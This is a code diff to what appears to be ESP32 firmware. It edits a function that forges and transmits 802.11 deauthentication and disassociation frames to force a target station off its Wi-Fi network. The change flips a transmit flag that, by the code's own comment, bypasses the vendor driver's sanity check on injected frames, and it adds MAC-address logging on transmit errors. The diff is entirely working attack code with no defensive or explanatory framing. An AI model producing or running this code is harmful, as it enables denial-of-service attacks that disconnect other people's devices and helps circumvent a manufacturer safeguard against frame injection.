@@ -91,12 +91,21 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[25] = 0x00;
 
     int ok = 0;
-    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    /* en_sys_seq=true lets the hardware manage the sequence number and
+     * also tends to bypass the blob's stricter sanity check on pre-
+     * stamped frames. Our seq bytes get overwritten by the hardware. */
+    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
     if (rc == ESP_OK) ok++;
     else {
         static uint32_t _last_tx_err_log = 0;
         if (millis() - _last_tx_err_log > 1000) {
-            Serial.printf("[80211_tx] deauth rc=%d (0x%x)\n", (int)rc, (unsigned)rc);
+            uint8_t actual_mac[6];
+            esp_wifi_get_mac(WIFI_IF_STA, actual_mac);
+            Serial.printf("[80211_tx] deauth rc=%d (0x%x) sta_mac=%02X:%02X:%02X:%02X:%02X:%02X addr2=%02X:%02X:%02X:%02X:%02X:%02X\n",
+                          (int)rc, (unsigned)rc,
+                          actual_mac[0], actual_mac[1], actual_mac[2],
+                          actual_mac[3], actual_mac[4], actual_mac[5],
+                          f[10], f[11], f[12], f[13], f[14], f[15]);
             _last_tx_err_log = millis();
         }
     }
@@ -107,7 +116,7 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
     f[25] = 0x00;
 
-    rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
     if (rc == ESP_OK) ok++;
     return ok;
 }
